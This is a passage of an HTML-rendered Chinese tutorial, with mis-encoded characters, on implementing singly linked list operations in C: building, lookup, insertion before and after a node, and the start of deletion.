class="keyword">sizeof</span>(LNode));</span><br><span class="line">    LinkList s,r = L;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">9999</span>)&#123;</span><br><span class="line">        s = (LinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">1</span>;</span><br><span class="line">    LinkList p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p != <span class="literal">NULL</span> &amp;&amp; j &lt; i)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j ++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°æŒ‰å€¼æŸ¥æ‰¾ç»“ç‚¹çš„å‡½æ•°å¦‚ä¸‹</span></span><br><span class="line">LinkList <span class="title function_">LocateElem</span><span class="params">(LinkList L,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">    LinkList p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; p-&gt;data != e)</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-æ’å…¥ç»“ç‚¹æ“ä½œ"><a class="markdownIt-Anchor" href="#5-æ’å…¥ç»“ç‚¹æ“ä½œ">#</a> 5ã€æ’å…¥ç»“ç‚¹æ“ä½œ</h3><h4 id="é€šè¿‡æŸ¥æ‰¾åˆ°æŒ‡å®šç»“ç‚¹çš„å‰é©±ç»“ç‚¹è¿›è¡Œåæ’æ“ä½œ"><a class="markdownIt-Anchor" href="#é€šè¿‡æŸ¥æ‰¾åˆ°æŒ‡å®šç»“ç‚¹çš„å‰é©±ç»“ç‚¹è¿›è¡Œåæ’æ“ä½œ">#</a> é€šè¿‡æŸ¥æ‰¾åˆ°æŒ‡å®šç»“ç‚¹çš„å‰é©±ç»“ç‚¹è¿›è¡Œåæ’æ“ä½œ</h4><p>â€‹æ’å…¥ç»“ç‚¹æ“ä½œå°†å€¼ä¸º x çš„æ–°ç»“ç‚¹æ’å…¥åˆ°å•é“¾è¡¨çš„ç¬¬ i ä¸ªä½ç½®ä¸Šã€‚å…ˆæ£€æŸ¥æ’å…¥ä½ç½®çš„åˆæ³•æ€§ï¼Œç„¶åæ‰¾åˆ°å¾…æ’å…¥ä½ç½®çš„å‰é©±ç»“ç‚¹ï¼Œå³ç¬¬ i - 1 ä¸ªç»“ç‚¹ï¼Œï¼Œå†åœ¨å…¶åæ’å…¥æ–°ç»“ç‚¹ã€‚</p><p>â€‹ç®—æ³•å…ˆè°ƒç”¨æŒ‰åºå·æŸ¥æ‰¾ç®—æ³• GetElem (L,i-1)ï¼ŒæŸ¥æ‰¾ç¬¬ i - 1 ä¸ªç»“ç‚¹ã€‚å‡è®¾è¿”å›çš„ç¬¬ i - 1 ä¸ªç»“ç‚¹ä¸º *pï¼Œç„¶åä»¤æ–°ç»“ç‚¹ *s çš„æŒ‡é’ˆåŸŸæŒ‡å‘ *p çš„åç»§ç»“ç‚¹ï¼Œå†é¢†ç»“ç‚¹ *p çš„æŒ‡é’ˆåŸŸæŒ‡å‘æ–°æ’å…¥çš„ç»“ç‚¹ *sã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/62db93febb24484fa28d873ff7b7c097.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å®ç°æ’å…¥ç»“ç‚¹çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList L)</span>;</span><br><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList L)</span>;</span><br><span class="line">LinkList <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>;</span><br><span class="line">LinkList <span class="title function_">LocateElem</span><span class="params">(LinkList L,<span class="type">int</span> e)</span>;</span><br><span class="line">LinkList <span class="title function_">PreInsert</span><span class="params">(LinkList L,<span class="type">int</span> i,<span class="type">int</span> e)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkList L,p;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¤´æ’æ³•å»ºç«‹é“¾è¡¨çš„å‡½æ•°è°ƒç”¨</span></span><br><span class="line"><span class="comment">//    L = List_HeadInsert(L);</span></span><br><span class="line">    <span class="comment">//å°¾æ’æ³•å»ºç«‹é“¾è¡¨çš„å‡½æ•°è°ƒç”¨</span></span><br><span class="line">    L = List_TailInsert(L);</span><br><span class="line">    L = PreInsert(L,<span class="number">5</span>,<span class="number">99</span>);</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    LinkList target =  GetElem(L,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%d&quot;</span>,target-&gt;data);</span><br><span class="line"></span><br><span class="line">    target = LocateElem(L,<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%d&quot;</span>,target-&gt;data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">    LNode *s;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line"></span><br><span class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span> (x!=<span class="number">9999</span>) &#123;</span><br><span class="line">        s = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        s-&gt;next = L-&gt;next;</span><br><span class="line">        L-&gt;next = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    LinkList s,r = L;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">9999</span>)&#123;</span><br><span class="line">        s = (LinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">1</span>;</span><br><span class="line">    LinkList p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p != <span class="literal">NULL</span> &amp;&amp; j &lt; i)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j ++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">LocateElem</span><span class="params">(LinkList L,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">    LinkList p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; p-&gt;data != e)</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°é€šè¿‡ç¬¬ i ä¸ªæ•°æ®çš„å‰é©±ç»“ç‚¹è¿›è¡Œæ’å…¥çš„å‡½æ•°ç®—æ³•</span></span><br><span class="line">LinkList <span class="title function_">PreInsert</span><span class="params">(LinkList L,<span class="type">int</span> i,<span class="type">int</span> e)</span>&#123;                       <span class="comment">//å®ç°åœ¨ç¬¬iä¸ªç»“ç‚¹ä¹‹åè¿›è¡Œæ’å…¥</span></span><br><span class="line">    LinkList p,s;</span><br><span class="line">    s = (LinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    p = GetElem(L,i<span class="number">-1</span>);                                         <span class="comment">//è·å–ç¬¬iä¸ªç»“ç‚¹çš„å‰é©±ç»“ç‚¹</span></span><br><span class="line">    s-&gt;data = e;</span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ‰©å±•å¯¹æŒ‡å®šç»“ç‚¹è¿›è¡Œå‰æ’æ“ä½œ"><a class="markdownIt-Anchor" href="#æ‰©å±•å¯¹æŒ‡å®šç»“ç‚¹è¿›è¡Œå‰æ’æ“ä½œ">#</a> æ‰©å±•ï¼šå¯¹æŒ‡å®šç»“ç‚¹è¿›è¡Œå‰æ’æ“ä½œ</h4><p>â€‹å‡è®¾ï¼Œæˆ‘ä»¬æƒ³å°†ç»“ç‚¹ s æ’å…¥åˆ° p ä¹‹å‰ã€‚é‚£ä¹ˆåˆ™éœ€è¦å°† s æ’åˆ° p çš„åé¢ï¼Œç„¶åäº¤æ¢ p-&gt;data ä¸ s-&gt;data åŸŸï¼Œè¿™æ ·æ—¢å¯ä»¥æ»¡è¶³äº†é€»è¾‘å…³ç³»ï¼Œåˆèƒ½ä½¿å¾—æ—¶é—´å¤æ‚åº¦ä¸º O (1)ã€‚</p><p>â€‹ä»£ç å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList L)</span>;</span><br><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList L)</span>;</span><br><span class="line">LinkList <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>;</span><br><span class="line">LinkList <span class="title function_">LocateElem</span><span class="params">(LinkList L,<span class="type">int</span> e)</span>;</span><br><span class="line">LinkList <span class="title function_">PreInsert</span><span class="params">(LinkList L,<span class="type">int</span> i,<span class="type">int</span> e)</span>;</span><br><span class="line">LinkList <span class="title function_">backInsert</span><span class="params">(LinkList L,<span class="type">int</span> i,<span class="type">int</span> e)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkList L,p;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¤´æ’æ³•å»ºç«‹é“¾è¡¨çš„å‡½æ•°è°ƒç”¨</span></span><br><span class="line"><span class="comment">//    L = List_HeadInsert(L);</span></span><br><span class="line">    <span class="comment">//å°¾æ’æ³•å»ºç«‹é“¾è¡¨çš„å‡½æ•°è°ƒç”¨</span></span><br><span class="line">    L = List_TailInsert(L);</span><br><span class="line">    L = backInsert(L,<span class="number">5</span>,<span class="number">99</span>);</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    LinkList target =  GetElem(L,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%d&quot;</span>,target-&gt;data);</span><br><span class="line"></span><br><span class="line">    target = LocateElem(L,<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%d&quot;</span>,target-&gt;data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">    LNode *s;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line"></span><br><span class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span> (x!=<span class="number">9999</span>) &#123;</span><br><span class="line">        s = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        s-&gt;next = L-&gt;next;</span><br><span class="line">        L-&gt;next = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    LinkList s,r = L;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">9999</span>)&#123;</span><br><span class="line">        s = (LinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">1</span>;</span><br><span class="line">    LinkList p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p != <span class="literal">NULL</span> &amp;&amp; j &lt; i)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j ++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">LocateElem</span><span class="params">(LinkList L,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">    LinkList p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; p-&gt;data != e)</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">PreInsert</span><span class="params">(LinkList L,<span class="type">int</span> i,<span class="type">int</span> e)</span>&#123;                       <span class="comment">//å®ç°åœ¨ç¬¬iä¸ªç»“ç‚¹ä¹‹åè¿›è¡Œæ’å…¥</span></span><br><span class="line">    LinkList p,s;</span><br><span class="line">    s = (LinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    p = GetElem(L,i<span class="number">-1</span>);                                         <span class="comment">//è·å–ç¬¬iä¸ªç»“ç‚¹çš„å‰é©±ç»“ç‚¹</span></span><br><span class="line">    s-&gt;data = e;</span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°åæ’ç»“ç‚¹çš„å‡½æ•°ä¸»é¢˜å¦‚ä¸‹</span></span><br><span class="line">LinkList <span class="title function_">backInsert</span><span class="params">(LinkList L,<span class="type">int</span> i,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">    LinkList p,s;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    s = (LinkList) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    p = GetElem(L,i);                                         <span class="comment">//è·å–ç¬¬iä¸ªç»“ç‚¹çš„å‰é©±ç»“ç‚¹</span></span><br><span class="line">    s-&gt;data = e;</span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line">    temp = p-&gt;data;</span><br><span class="line">    p-&gt;data = s-&gt;data;</span><br><span class="line">    s-&gt;data = temp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-åˆ é™¤ç»“ç‚¹æ“ä½œ"><a class="markdownIt-Anchor" href="#6-åˆ é™¤ç»“ç‚¹æ“ä½œ">#</a> 6ã€åˆ é™¤ç»“ç‚¹æ“ä½œï¼š</h3><p>â€‹åˆ é™¤ç»“ç‚¹æ“ä½œæ˜¯å°†å•é“¾è¡¨çš„ç¬¬ i ä¸ªç»“ç‚¹åˆ é™¤ã€‚å…ˆæ£€æŸ¥åˆ é™¤ä½ç½®çš„åˆæ³•æ€§ï¼ŒåæŸ¥æ‰¾è¡¨ä¸­ç¬¬ i - 1 ä¸ªç»“ç‚¹ï¼Œå³è¢«åˆ ç»“ç‚¹çš„å‰é©±ç»“ç‚¹ï¼Œå†å°†å…¶åˆ é™¤ã€‚å¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/26c70d893d754b979a0149b17d1e59bc.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä»£ç å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList L)</span>;</span><br><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList L)</span>;</span><br><span class="line">LinkList <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>;</span><br><span class="line">LinkList <span class="title function_">LocateElem</span><span class="params">(LinkList L,<span class="type">int</span> e)</span>;</span><br><span class="line">LinkList <span class="title function_">PreInsert</span><span class="params">(LinkList 